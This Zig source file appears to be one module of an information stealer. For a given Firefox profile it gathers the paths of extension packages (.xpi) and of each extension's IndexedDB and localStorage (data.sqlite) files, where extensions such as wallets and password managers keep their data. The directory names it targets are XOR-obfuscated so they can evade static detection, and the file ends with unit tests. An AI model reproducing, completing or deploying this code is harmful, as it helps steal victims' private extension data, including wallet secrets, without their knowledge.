const std = @import("std");
const hash = @import("../types/hash.zig");

const E = struct {
    pub const storage = hash.xorEncrypt("storage");
    pub const default_dir = hash.xorEncrypt("default");
    pub const moz_prefix = hash.xorEncrypt("moz-extension-");
    pub const extensions_dir = hash.xorEncrypt("extensions");
    pub const idb_dir = hash.xorEncrypt("idb");
    pub const ls_dir = hash.xorEncrypt("ls");
    pub const data_sqlite = hash.xorEncrypt("data.sqlite");
};

fn collectXpiFiles(allocator: std.mem.Allocator, profile_path: []const u8, files: *std.ArrayList([]const u8)) void {
    var ext_buf: [E.extensions_dir.len]u8 = undefined;
    hash.xorDecrypt(&E.extensions_dir, &ext_buf);

    const ext_path = std.fs.path.join(allocator, &[_][]const u8{ profile_path, ext_buf[0..] }) catch return;
    defer allocator.free(ext_path);

    var dir = std.fs.openDirAbsolute(ext_path, .{ .iterate = true }) catch return;
    defer dir.close();

    var iter = dir.iterate();
    while (iter.next() catch {}) |entry| {
        if (entry.kind != .file) continue;
        if (!std.mem.endsWith(u8, entry.name, ".xpi")) continue;
        const full = std.fs.path.join(allocator, &[_][]const u8{ ext_path, entry.name }) catch continue;
        files.append(full) catch {
            allocator.free(full);
            return;
        };
    }
}

fn collectMozExtensionStorages(allocator: std.mem.Allocator, profile_path: []const u8, files: *std.ArrayList([]const u8)) void {
    var st_buf: [E.storage.len]u8 = undefined;
    var def_buf: [E.default_dir.len]u8 = undefined;
    var mz_buf: [E.moz_prefix.len]u8 = undefined;
    var idb_buf: [E.idb_dir.len]u8 = undefined;
    var ls_buf: [E.ls_dir.len]u8 = undefined;
    var ds_buf: [E.data_sqlite.len]u8 = undefined;
    hash.xorDecrypt(&E.storage, &st_buf);
    hash.xorDecrypt(&E.default_dir, &def_buf);
    hash.xorDecrypt(&E.moz_prefix, &mz_buf);
    hash.xorDecrypt(&E.idb_dir, &idb_buf);
    hash.xorDecrypt(&E.ls_dir, &ls_buf);
    hash.xorDecrypt(&E.data_sqlite, &ds_buf);

    const storage_path = std.fs.path.join(allocator, &[_][]const u8{ profile_path, st_buf[0..], def_buf[0..] }) catch return;
    defer allocator.free(storage_path);

    var dir = std.fs.openDirAbsolute(storage_path, .{ .iterate = true }) catch return;
    defer dir.close();

    var iter = dir.iterate();
    while (iter.next() catch {}) |entry| {
        if (entry.kind != .directory) continue;
        if (!std.mem.startsWith(u8, entry.name, mz_buf[0..])) continue;

        const moz_dir = std.fs.path.join(allocator, &[_][]const u8{ storage_path, entry.name }) catch continue;
        defer allocator.free(moz_dir);

        const idb_path = std.fs.path.join(allocator, &[_][]const u8{ moz_dir, idb_buf[0..] }) catch continue;
        defer allocator.free(idb_path);

        var idb_dir = std.fs.openDirAbsolute(idb_path, .{ .iterate = true }) catch {};
        if (idb_dir) |id| {
            defer id.close();
            var idb_iter = id.iterate();
            while (idb_iter.next() catch {}) |idb_entry| {
                if (idb_entry.kind != .file) continue;
                const full = std.fs.path.join(allocator, &[_][]const u8{ idb_path, idb_entry.name }) catch continue;
                files.append(full) catch {
                    allocator.free(full);
                    return;
                };
            }
        }

        const ls_path = std.fs.path.join(allocator, &[_][]const u8{ moz_dir, ls_buf[0..], ds_buf[0..] }) catch continue;
        defer allocator.free(ls_path);

        const ls_file = std.fs.openFileAbsolute(ls_path, .{}) catch {};
        if (ls_file) |lf| {
            lf.close();
            files.append(ls_path) catch {
                return;
            };
        }
    }
}

pub fn collect(allocator: std.mem.Allocator, profile_path: []const u8) ![][]const u8 {
    var files = std.ArrayList([]const u8).init(allocator);
    errdefer {
        for (files.items) |f| allocator.free(f);
        files.deinit();
    }

    collectXpiFiles(allocator, profile_path, &files);
    collectMozExtensionStorages(allocator, profile_path, &files);

    return files.toOwnedSlice();
}

test "collect returns empty for nonexistent profile" {
    const result = try collect(std.testing.allocator, "C:\\__nonexistent__firefox_ext");
    defer {
        for (result) |f| std.testing.allocator.free(f);
        std.testing.allocator.free(result);
    }
    try std.testing.expectEqual(@as(usize, 0), result.len);
}

test "collectXpiFiles handles missing extensions dir" {
    var list = std.ArrayList([]const u8).init(std.testing.allocator);
    defer {
        for (list.items) |f| std.testing.allocator.free(f);
        list.deinit();
    }
    collectXpiFiles(std.testing.allocator, "C:\\__nonexistent__", &list);
    try std.testing.expectEqual(@as(usize, 0), list.items.len);
}

test "collectMozExtensionStorages handles missing storage dir" {
    var list = std.ArrayList([]const u8).init(std.testing.allocator);
    defer {
        for (list.items) |f| std.testing.allocator.free(f);
        list.deinit();
    }
    collectMozExtensionStorages(std.testing.allocator, "C:\\__nonexistent__", &list);
    try std.testing.expectEqual(@as(usize, 0), list.items.len);
}
